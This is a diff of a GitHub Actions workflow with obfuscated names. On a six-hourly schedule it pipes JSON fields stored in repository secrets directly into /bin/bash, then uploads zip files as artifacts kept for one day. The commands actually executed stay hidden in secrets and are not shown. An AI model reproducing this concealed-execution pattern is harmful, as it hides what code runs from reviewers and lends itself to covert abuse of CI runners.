@@ -1,24 +1,24 @@
 name: patrickfacadefresh
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '1 0/6 * * *'
 
+  schedule:
+    - cron: '47 0,6,12,18 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: patrickfacadefresh
         env:
-          lauwu1213: ${{ secrets.lauwu1213 }}
+          hcg9: ${{ secrets.hcg9 }}
         run: |
-          echo $lauwu1213 | jq -r .ozi4783 | /bin/bash
-          echo $hdkep3 | jq -r .aliyd75 | /bin/bash
-          echo $xmoc35232 | jq -r .u395 | /bin/bash
-          echo $px449 | jq -r .qgtei7644 | /bin/bash
-          echo $o6727 | jq -r .gxla07 | /bin/bash
-          echo $ywq5 | jq -r .txjv88767 | /bin/bash
-          echo $mvude359 | jq -r .cygls690 | /bin/bash
+          printf '%s' "$hcg9" | jq -r .ix08 | /bin/bash
+          echo $dseq6 | jq -r .vpr724 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: ylSouAkP
+          path: "*.zip"
+          retention-days: 1
